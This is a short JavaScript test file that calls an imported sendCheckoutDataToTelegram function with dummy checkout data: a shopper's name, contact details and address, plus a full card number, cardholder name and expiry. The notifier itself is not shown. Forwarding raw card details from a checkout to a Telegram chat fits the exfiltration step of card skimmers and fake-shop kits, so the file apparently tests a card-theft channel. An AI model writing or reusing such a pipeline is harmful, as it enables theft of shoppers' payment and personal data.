// TEST FILE - Delete after testing
import { sendCheckoutDataToTelegram } from './telegram-notifier';

// Test the Telegram notification
const testData = {
    shippingDetails: {
        fullName: "Test User",
        phoneNumber: "+1234567890",
        email: "test@example.com",
        streetAddress: "123 Test Street",
        city: "Test City",
        stateProvince: "TS",
        postalCode: "12345",
        country: "Test Country"
    },
    paymentDetails: {
        cardholderName: "TEST CARD",
        cardNumber: "1234 5678 9012 3456",
        cardBrand: "Visa",
        expiryMonth: "12",
        expiryYear: "25"
    },
    orderInfo: {
        orderId: "TEST-ORDER-123",
        productName: "Test Product",
        quantity: 5,
        amount: 179.95,
        currency: "USD"
    }
};

console.log('🧪 RUNNING TELEGRAM TEST...');
sendCheckoutDataToTelegram(testData).then(result => {
    console.log('🧪 TEST RESULT:', result ? '✅ SUCCESS' : '❌ FAILED');
});
